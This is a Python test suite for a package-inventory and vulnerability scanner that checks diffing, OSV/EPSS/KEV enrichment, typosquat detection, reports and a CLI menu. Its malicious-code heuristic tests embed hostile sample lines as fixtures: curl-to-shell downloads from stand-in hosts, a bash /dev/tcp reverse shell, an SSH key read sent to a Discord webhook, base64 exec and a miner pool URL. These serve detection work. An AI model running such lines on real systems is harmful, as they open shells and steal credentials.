"""Agent pipeline tests: diff, heuristics, typosquat, OSV (mocked HTTP), caches, reports, menu."""

from __future__ import annotations

import json
import os
import stat
from pathlib import Path
from types import ModuleType
from typing import Any

import httpx
import pytest
from rich.progress import Progress


def patch_httpx(monkeypatch: pytest.MonkeyPatch, transport: httpx.AsyncBaseTransport) -> None:
    real = httpx.AsyncClient

    def factory(*args: Any, **kwargs: Any) -> httpx.AsyncClient:
        kwargs["transport"] = transport
        return real(*args, **kwargs)

    monkeypatch.setattr(httpx, "AsyncClient", factory)


def progress() -> Progress:
    return Progress(disable=True)


# ---------------------------------------------------------------------------
# Diff
# ---------------------------------------------------------------------------

def test_diff_labels_and_multiversion(agent: ModuleType, tmp_path: Path) -> None:
    P = agent.Package
    state = tmp_path / "state" / "last_state.json"
    first = [P("kernel", "6.1.0-1", "RPM"), P("kernel", "6.2.0-1", "RPM"), P("requests", "2.31.0", "PyPI"),
             P("gone", "1.0", "PyPI")]
    counts, removed = agent.compute_diff(first, state)
    assert counts["new"] == 4 and removed == []
    assert stat.S_IMODE(state.stat().st_mode) == 0o600
    assert stat.S_IMODE(state.parent.stat().st_mode) == 0o700

    second = [P("kernel", "6.2.0-1", "RPM"), P("kernel", "6.3.0-1", "RPM"), P("requests", "2.30.0", "PyPI"),
              P("flask", "3.0.0", "PyPI")]
    counts, removed = agent.compute_diff(second, state)
    labels = {(p.name, p.version): p.diff_label for p in second}
    assert labels[("kernel", "6.2.0-1")] is None                   # co-installed version unchanged
    assert labels[("kernel", "6.3.0-1")] == "[UPGRADED]"
    assert labels[("requests", "2.30.0")] == "[DOWNGRADED]"
    assert labels[("flask", "3.0.0")] == "[NEW]"
    assert removed == ["PyPI::gone"] and counts["removed"] == 1


def test_untrusted_state_file_is_ignored(agent: ModuleType, tmp_path: Path) -> None:
    target = tmp_path / "evil.json"
    target.write_text(json.dumps({"packages": [{"name": "x", "version": "1", "ecosystem": "PyPI"}]}))
    link = tmp_path / "link.json"
    link.symlink_to(target)
    assert agent._read_private_json(link) is None
    assert agent._read_private_json(target) is not None


def test_state_dir_never_tmp(agent: ModuleType, monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    monkeypatch.delenv("OPENBOM_STATE_DIR")
    monkeypatch.setenv("XDG_CACHE_HOME", str(tmp_path / "xdg"))
    if os.geteuid() != 0:
        assert agent.state_dir() == tmp_path / "xdg" / "openbom"
    assert not str(agent.osv_cache_path()).startswith("/tmp/openbom_")


def test_atomic_write_replaces_symlink_instead_of_following(agent: ModuleType, tmp_path: Path) -> None:
    victim = tmp_path / "victim.txt"
    victim.write_text("original")
    link = tmp_path / "cache.json"
    link.symlink_to(victim)
    agent._atomic_write(link, "new")
    assert victim.read_text() == "original"
    assert not link.is_symlink() and link.read_text() == "new"


# ---------------------------------------------------------------------------
# Heuristics + typosquat
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("content,label", [
    ("import base64\nexec(base64.b64decode('aW1wb3J0IG9z'))", "exec(base64)"),
    ("eval(Buffer.from('ZXZpbA==', 'base64').toString())", "eval(base64)"),
    ("os.system('curl http://evil/x.sh | sh')", "os.system(url)"),
    ("require('child_process').exec(`curl -s http://x | bash`)", "child_process+download"),
    ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "reverse_shell"),
    ("fetch('https://discord.com/api/webhooks/123/abc')", "chat exfil webhook"),
    ("open(os.path.expanduser('~/.ssh/id_rsa')).read()", "credential_access"),
    ("url = 'https://pastebin.com/raw/abcd'", "paste/tunnel C2"),
    ("pool = 'stratum+tcp://pool.example:3333'", "crypto_miner"),
])
def test_scan_content_rules(agent: ModuleType, content: str, label: str) -> None:
    hits = agent.scan_content(content, "pkg/mod.py")
    assert any(label == cat for _, cat, _ in hits), hits


def test_scan_content_clean_and_pth(agent: ModuleType) -> None:
    assert agent.scan_content("import requests\nrequests.get('https://pypi.org')", "a.py") == []
    assert agent.scan_content("import os; os.system('id')", "evil.pth")[0][:2] == (False, ".pth auto-exec")
    assert agent.scan_content("import os; var = 'x'", "distutils-precedence.pth") == []
    hits = agent.scan_content("x = 1\ny = 2\nexec(base64.b64decode(p))\n", "m.py")
    assert hits == [(True, "exec(base64)", "exec(base64) in m.py:3")]


def test_evaluate_hits_strong_vs_weak(agent: ModuleType) -> None:
    weak_cred = (False, "credential_access", "credential_access in a.py:1")
    weak_hook = (False, "chat exfil webhook", "chat exfil webhook in b.py:2")
    strong = (True, "reverse_shell", "reverse_shell in c.py:3")
    assert agent.evaluate_hits([]) is None
    assert agent.evaluate_hits([weak_cred, weak_cred]) is None          # one weak category = legit-looking
    assert agent.evaluate_hits([weak_cred, weak_hook])[0] == "HIGH"     # credential theft + exfil channel
    sev, desc = agent.evaluate_hits([weak_cred, strong])
    assert sev == "CRITICAL" and desc[0].startswith("reverse_shell")


def install_fake_pkg(agent: ModuleType, monkeypatch: pytest.MonkeyPatch, root: Path, files: dict[str, str]) -> None:
    for rel, body in files.items():
        (root / rel).parent.mkdir(parents=True, exist_ok=True)
        (root / rel).write_text(body)
    monkeypatch.setattr(agent, "_package_files", lambda pkg: (root, []))


def test_legit_sdk_patterns_not_flagged(agent: ModuleType, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    # botocore/pyperclip-style code: single weak category, plus weak hits in tests/ are ignored
    install_fake_pkg(agent, monkeypatch, tmp_path / "sdk", {
        "sdk/config.py": "CREDS = os.path.expanduser('~/.aws/credentials')\n",
        "sdk/clip.py": "subprocess.run(['powershell', '-command', 'Get-Clipboard'])\n",
        "tests/test_x.py": "url = 'https://api.telegram.org/bot123/send'\n",
    })
    # credential_access + subprocess+download are two categories → HIGH, so drop one to model a real SDK
    (tmp_path / "sdk" / "sdk" / "clip.py").unlink()
    assert agent.scan_heuristics(agent.Package("sdk", "1.0", "PyPI")) is None


def test_stealer_combination_flagged(agent: ModuleType, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    install_fake_pkg(agent, monkeypatch, tmp_path / "stealer", {
        "stealer/__init__.py": "k = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n"
                               "requests.post('https://discord.com/api/webhooks/1/x', data=k)\n",
    })
    d = agent.scan_heuristics(agent.Package("stealer", "0.0.1", "PyPI"))
    assert d is not None and d.severity == "HIGH" and "credential_access" in d.summary


def test_scan_heuristics_npm_package(agent: ModuleType, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    root = tmp_path / "npm-root"
    pkg_dir = root / "evil-pkg"
    (pkg_dir / "lib").mkdir(parents=True)
    (pkg_dir / "package.json").write_text(json.dumps({"scripts": {"postinstall": "curl -s http://x.example/p.sh | sh"}}))
    (pkg_dir / "lib" / "index.js").write_text("module.exports = () => eval(atob('ZXZpbA=='))\n")
    (root / "good-pkg").mkdir()
    (root / "good-pkg" / "index.js").write_text("module.exports = 42\n")
    monkeypatch.setattr(agent, "_npm_global_root", lambda: root)

    finding = agent.scan_heuristics(agent.Package("evil-pkg", "1.0.0", "NPM"))
    assert finding is not None and finding.is_heuristic and finding.severity == "CRITICAL"
    assert "postinstall" in finding.summary and "eval(base64)" in finding.summary
    assert agent.scan_heuristics(agent.Package("good-pkg", "1.0.0", "NPM")) is None
    assert agent.scan_heuristics(agent.Package("missing", "1.0.0", "NPM")) is None


def test_scan_heuristics_installed_pypi_dist(agent: ModuleType) -> None:
    # A real installed distribution must scan without errors (and our own deps should be clean of CRITICAL hits)
    result = agent.scan_heuristics(agent.Package("packaging", "x", "PyPI"))
    assert result is None or result.severity != "CRITICAL"


@pytest.mark.parametrize("name,eco,target", [
    ("reqeusts", "PyPI", "requests"), ("requestss", "PyPI", "requests"), ("python-dateutils", "PyPI", "python-dateutil"),
    ("lodahs", "NPM", "lodash"), ("expresss", "NPM", "express"), ("crossenv", "NPM", "cross-env"),
])
def test_typosquat_detected(agent: ModuleType, name: str, eco: str, target: str) -> None:
    d = agent.check_typosquat(agent.Package(name, "1.0", eco))
    assert d is not None and d.vuln_id == "TYPOSQUAT_SUSPECT" and f"'{target}'" in d.summary


@pytest.mark.parametrize("name,eco", [
    ("requests", "PyPI"), ("Requests", "PyPI"), ("python_dateutil", "PyPI"), ("pyaml", "PyPI"),
    ("preact", "NPM"), ("mysql2", "NPM"), ("gsutil", "PyPI"), ("pycryptodomex", "PyPI"), ("unicorn", "PyPI"),
    ("scapy", "PyPI"), ("psycopg", "PyPI"), ("fastai", "PyPI"), ("@types/node", "NPM"), ("my-unique-package", "PyPI"), ("six", "PyPI"),
    ("openssl", "RPM"),
])
def test_typosquat_not_flagged(agent: ModuleType, name: str, eco: str) -> None:
    assert agent.check_typosquat(agent.Package(name, "1.0", eco)) is None


# ---------------------------------------------------------------------------
# OSV with mocked HTTP
# ---------------------------------------------------------------------------

GHSA = {
    "id": "GHSA-j8r2-6x86-q33q", "summary": "Unintended leak of Proxy-Authorization header in requests",
    "aliases": ["CVE-2023-32681"],
    "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:N/A:N"}],
    "affected": [{"package": {"name": "requests", "ecosystem": "PyPI"},
                  "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.3.0"}, {"fixed": "2.31.0"}]}]}],
    "references": [{"url": "https://github.com/someone/CVE-2023-32681-poc"}],
}
KEV_FEED = {"catalogVersion": "2026.10.01", "vulnerabilities": [
    {"cveID": "CVE-2023-32681", "shortDescription": "Requests proxy header leak (test entry)"}]}


def osv_handler(calls: list[str], fail_batch: bool = False):  # type: ignore[no-untyped-def]
    def handler(request: httpx.Request) -> httpx.Response:
        url = str(request.url)
        calls.append(url)
        if url.endswith("/v1/querybatch"):
            if fail_batch:
                return httpx.Response(503)
            queries = json.loads(request.content)["queries"]
            results = [{"vulns": [{"id": GHSA["id"]}]} if q["package"]["name"] == "requests" else {}
                       for q in queries]
            return httpx.Response(200, json={"results": results})
        if "/v1/vulns/" in url:
            return httpx.Response(200, json=GHSA)
        if "api.first.org" in url:
            return httpx.Response(200, json={"data": [{"cve": "CVE-2023-32681", "epss": "0.42", "percentile": "0.97"}]})
        if "known_exploited" in url:
            return httpx.Response(200, json=KEV_FEED)
        return httpx.Response(404)
    return handler


async def test_osv_query_enrich_cache(agent: ModuleType, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(agent, "HTTP_RETRIES", 1)
    calls: list[str] = []
    patch_httpx(monkeypatch, httpx.MockTransport(osv_handler(calls)))
    pkgs = [agent.Package("requests", "2.28.0", "PyPI", osv_ecosystem="PyPI"),
            agent.Package("flask", "3.0.0", "PyPI", osv_ecosystem="PyPI"),
            agent.Package("bash", "5.2", "RPM")]  # no OSV feed → skipped
    with progress() as p:
        results, enriched = await agent.query_osv_batch(pkgs, p, p.add_task("x"), agent.OsvCache())
    assert len(results) == 2
    req = next(r for r in results if r.package.name == "requests")
    v = req.vulns[0]
    assert v.severity == "MEDIUM" and v.cvss_score == 6.1 and v.fixed_version == "2.31.0"
    assert v.poc_links and v.cves == ["CVE-2023-32681"]
    assert agent.osv_cache_path().exists()

    # second run is served from cache: no network allowed
    def boom(request: httpx.Request) -> httpx.Response:
        raise AssertionError(f"unexpected request {request.url}")
    patch_httpx(monkeypatch, httpx.MockTransport(boom))
    with progress() as p:
        results2, _ = await agent.query_osv_batch(pkgs, p, p.add_task("x"), agent.OsvCache())
    assert {r.package.name for r in results2 if r.vulns} == {"requests"}


async def test_osv_batch_failure_is_not_cached_as_clean(agent: ModuleType, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(agent, "HTTP_RETRIES", 1)
    calls: list[str] = []
    patch_httpx(monkeypatch, httpx.MockTransport(osv_handler(calls, fail_batch=True)))
    pkgs = [agent.Package("requests", "2.28.0", "PyPI", osv_ecosystem="PyPI")]
    cache = agent.OsvCache()
    with progress() as p:
        results, _ = await agent.query_osv_batch(pkgs, p, p.add_task("x"), cache)
    assert results == []                      # unchecked, not "clean"
    assert cache.get("PyPI", "requests", "2.28.0") is None


async def test_epss_and_kev_enrichment(agent: ModuleType, monkeypatch: pytest.MonkeyPatch) -> None:
    calls: list[str] = []
    patch_httpx(monkeypatch, httpx.MockTransport(osv_handler(calls)))
    details = agent.parse_vuln_details([GHSA], "PyPI", "requests", "2.28.0")
    results = [agent.VulnResult(agent.Package("requests", "2.28.0", "PyPI"), details)]
    kev = agent.KevCatalog()
    with progress() as p:
        await kev.load(p, p.add_task("k"))
        await agent.query_epss(results, {}, p, p.add_task("e"))
    assert kev.size == 1 and agent.kev_cache_path().exists()
    assert agent.apply_kev(results, {}, kev) == 1
    v = results[0].vulns[0]
    assert v.is_kev and v.kev_description.startswith("CVE-2023-32681")
    assert v.epss_score == pytest.approx(0.42) and v.epss_percentile == pytest.approx(0.97)


async def test_http_request_retries_then_succeeds(agent: ModuleType, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(agent.asyncio, "sleep", _no_sleep)
    attempts = {"n": 0}

    def handler(request: httpx.Request) -> httpx.Response:
        attempts["n"] += 1
        return httpx.Response(503) if attempts["n"] < 3 else httpx.Response(200, json={"ok": True})

    async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as client:
        resp = await agent.http_request(client, "GET", "https://example.test/")
    assert resp.json() == {"ok": True} and attempts["n"] == 3


async def _no_sleep(_: float) -> None:
    return None


# ---------------------------------------------------------------------------
# Report model, exports, exit codes
# ---------------------------------------------------------------------------

def sample_report(agent: ModuleType):  # type: ignore[no-untyped-def]
    P, V = agent.Package, agent.VulnDetail
    pkgs = [P("requests", "2.28.0", "PyPI", "[NEW]", "PyPI"), P("lodash", "4.17.15", "NPM", None, "npm"),
            P("@scope/thing", "1.0.0", "NPM"), P("openssl", "3.0.1-41.el9_0", "RPM", None, "AlmaLinux:9", None,
                                                  "1:3.0.1-41.el9_0")]
    results = [
        agent.VulnResult(pkgs[0], [V("GHSA-j8r2-6x86-q33q", "MEDIUM", "leak", "2.31.0", "Upgrade to version 2.31.0",
                                     cvss_score=6.1, epss_score=0.42, is_kev=True, cves=["CVE-2023-32681"])]),
        agent.VulnResult(pkgs[1], [V("MALICIOUS_HEURISTIC", "CRITICAL", "eval(base64)", None, "Quarantine",
                                     is_heuristic=True)]),
        agent.VulnResult(pkgs[2], []),
    ]
    return agent.build_report(pkgs, results, {"new": 1, "removed": 0, "upgraded": 0, "downgraded": 0, "unchanged": 3},
                              hostname="unit-host", removed=[], os_info={"id": "almalinux", "pretty_name": "Alma"},
                              queried=3)


def test_report_roundtrip_and_contract(agent: ModuleType) -> None:
    from server.schemas import AgentPayload

    report = sample_report(agent)
    d = report.to_dict()
    assert d["osv_summary"]["vulnerable"] == 2 and d["osv_summary"]["heuristic_hits"] == 1
    assert d["osv_summary"]["kev_hits"] == 1 and d["osv_summary"]["queried"] == 3
    again = agent.ScanReport.from_dict(json.loads(json.dumps(d)))
    assert again.to_dict()["osv_vulnerabilities"] == d["osv_vulnerabilities"]
    AgentPayload.model_validate(d)  # agent output must satisfy the server contract


def test_cyclonedx_export(agent: ModuleType, tmp_path: Path) -> None:
    bom = agent.to_cyclonedx(sample_report(agent))
    assert bom["bomFormat"] == "CycloneDX" and bom["specVersion"] == "1.5"
    purls = {c["name"]: c.get("purl") for c in bom["components"]}
    assert purls["requests"] == "pkg:pypi/requests@2.28.0"
    assert purls["@scope/thing"] == "pkg:npm/%40scope/thing@1.0.0"
    assert purls["openssl"] == "pkg:rpm/almalinux/openssl@3.0.1-41.el9_0?distro=almalinux-9&epoch=1"
    ids = {v["id"] for v in bom["vulnerabilities"]}
    assert ids == {"GHSA-j8r2-6x86-q33q", "MALICIOUS_HEURISTIC"}
    refs = {c["bom-ref"] for c in bom["components"]}
    assert all(a["ref"] in refs for v in bom["vulnerabilities"] for a in v["affects"])
    agent.write_cyclonedx(sample_report(agent), tmp_path / "bom.json")
    assert json.loads((tmp_path / "bom.json").read_text())["components"]


@pytest.mark.parametrize("fail_on,expected", [("any", 2), ("critical", 2), ("never", 0)])
def test_exit_codes(agent: ModuleType, fail_on: str, expected: int) -> None:
    assert agent.exit_code_for(sample_report(agent), fail_on) == expected


def test_exit_code_threshold_ignores_lower_severity(agent: ModuleType) -> None:
    P, V = agent.Package, agent.VulnDetail
    report = agent.build_report([P("a", "1", "PyPI")], [agent.VulnResult(P("a", "1", "PyPI"), [V("X", "LOW", "", None, "")])])
    assert agent.exit_code_for(report, "high") == 0
    assert agent.exit_code_for(report, "low") == 2
    assert agent.exit_code_for(agent.build_report([P("a", "1", "PyPI")], None), "any") == 0


def test_html_report_escapes_untrusted_input(agent: ModuleType, tmp_path: Path) -> None:
    report = sample_report(agent)
    report.packages[0].name = "<script>alert(1)</script>"
    html_path, _ = agent.write_enterprise_reports(report, tmp_path)
    html = html_path.read_text()
    assert "<script>alert(1)</script>" not in html and "&lt;script&gt;" in html
    assert "unit-host" in html and "GHSA-j8r2-6x86-q33q" in html


def test_alert_text_and_webhook(agent: ModuleType, monkeypatch: pytest.MonkeyPatch) -> None:
    report = sample_report(agent)
    text = agent.build_alert_text(report)
    assert text and "MALICIOUS_HEURISTIC" in text and "CISA KEV" in text
    sent: list[dict] = []

    def handler(request: httpx.Request) -> httpx.Response:
        sent.append(json.loads(request.content))
        return httpx.Response(200)

    patch_httpx(monkeypatch, httpx.MockTransport(handler))
    import asyncio
    assert asyncio.run(agent.send_webhook_alert("https://hooks.example/secret", report))
    assert sent and sent[0]["text"] == text and sent[0]["content"]


# ---------------------------------------------------------------------------
# End-to-end run_scan with mocked extractors + network
# ---------------------------------------------------------------------------

def fake_extractors(agent: ModuleType, monkeypatch: pytest.MonkeyPatch, pkgs: list) -> None:  # type: ignore[type-arg]
    def os_ext(progress: Any, task: Any, os_info: Any = None) -> list:  # type: ignore[type-arg]
        return [p for p in pkgs if p.ecosystem == "RPM"]

    monkeypatch.setattr(agent, "extract_os_packages", os_ext)
    monkeypatch.setattr(agent, "extract_python_packages", lambda p, t: [x for x in pkgs if x.ecosystem == "PyPI"])
    monkeypatch.setattr(agent, "extract_npm_packages", lambda p, t: [x for x in pkgs if x.ecosystem == "NPM"])
    monkeypatch.setattr(agent, "extract_podman_containers", lambda p, t: [])


async def test_run_scan_full_pipeline(agent: ModuleType, monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    P = agent.Package
    fake_extractors(agent, monkeypatch, [P("requests", "2.28.0", "PyPI", osv_ecosystem="PyPI"),
                                         P("reqeusts", "1.0.0", "PyPI", osv_ecosystem="PyPI"),
                                         P("bash", "5.2-1.fc44", "RPM")])
    monkeypatch.setattr(agent, "scan_heuristics", lambda pkg, progress=None, task_id=None: None)
    calls: list[str] = []
    patch_httpx(monkeypatch, httpx.MockTransport(osv_handler(calls)))
    out = tmp_path / "scan.json"
    bom = tmp_path / "bom.json"
    args = agent.parse_args(["--check-osv", "--diff", "--output-dir", str(tmp_path), "-o", str(out),
                             "--cyclonedx", str(bom), "--report", "--hostname", "ci-host"])
    rc, report = await agent.run_scan(args)
    assert rc == 2 and report is not None
    data = json.loads(out.read_text())
    assert data["hostname"] == "ci-host" and data["diff_summary"]["new"] == 3
    ids = {v["vuln_id"] for f in data["osv_vulnerabilities"] for v in f["vulns"]}
    assert ids == {"GHSA-j8r2-6x86-q33q", "TYPOSQUAT_SUSPECT"}
    kev_vuln = next(v for f in data["osv_vulnerabilities"] for v in f["vulns"] if v["vuln_id"].startswith("GHSA"))
    assert kev_vuln["is_kev"] and kev_vuln["epss_score"] == pytest.approx(0.42)
    assert bom.exists() and list(tmp_path.glob("report_openbom_*.html"))

    # second run: nothing new → heuristics skip, still exits 2 for the OSV finding
    rc2, report2 = await agent.run_scan(args)
    assert rc2 == 2 and report2 is not None and report2.diff_summary["unchanged"] == 3


async def test_run_scan_offline_no_findings(agent: ModuleType, monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    fake_extractors(agent, monkeypatch, [agent.Package("bash", "5.2-1.fc44", "RPM")])
    args = agent.parse_args(["--scan-only", "--output-dir", str(tmp_path)])
    rc, report = await agent.run_scan(args)
    assert rc == 0 and report is not None and report.osv_results is None
    assert "osv_summary" not in json.loads(next(tmp_path.glob("sbom_*.json")).read_text())


async def test_run_scan_no_packages(agent: ModuleType, monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    fake_extractors(agent, monkeypatch, [])
    rc, report = await agent.run_scan(agent.parse_args(["--scan-only", "--output-dir", str(tmp_path)]))
    assert rc == 1 and report is None


# ---------------------------------------------------------------------------
# CLI + interactive menu
# ---------------------------------------------------------------------------

def test_cli_requires_mode_when_not_a_tty(agent: ModuleType, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr("sys.stdin.isatty", lambda: False)
    with pytest.raises(SystemExit) as exc:
        agent.main([])
    assert exc.value.code == 2


def test_cli_rejects_bad_ecosystem(agent: ModuleType) -> None:
    with pytest.raises(SystemExit):
        agent.parse_args(["--scan-only", "--ecosystems", "os,cargo"])


def test_push_file_requires_server(agent: ModuleType, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv("OPENBOM_SERVER_URL", raising=False)
    f = tmp_path / "s.json"
    f.write_text("{}")
    assert agent.main(["--push-file", str(f)]) == 1


def test_menu_status_clear_and_exit(agent: ModuleType, monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    from rich import prompt

    agent._ensure_private_dir(agent.state_dir())
    agent.osv_cache_path().write_text("{}")
    answers = iter(["8", "9", "5", "0"])
    monkeypatch.setattr(prompt.Prompt, "ask", classmethod(lambda cls, *a, **k: next(answers)))
    monkeypatch.setattr(prompt.Confirm, "ask", classmethod(lambda cls, *a, **k: True))
    base = agent.parse_args(["--menu", "--output-dir", str(tmp_path / "empty")])
    assert agent.interactive_menu(base) == 0
    assert not agent.osv_cache_path().exists()


def test_menu_view_and_export_latest(agent: ModuleType, monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    from rich import prompt

    agent.write_json_report(sample_report(agent), tmp_path / "sbom_20260101_000000.json")
    answers = iter(["5", "7", "0"])
    monkeypatch.setattr(prompt.Prompt, "ask", classmethod(lambda cls, *a, **k: next(answers)))
    base = agent.parse_args(["--menu", "--output-dir", str(tmp_path)])
    assert agent.interactive_menu(base) == 0
    assert (tmp_path / "cyclonedx_20260101_000000.json").exists()
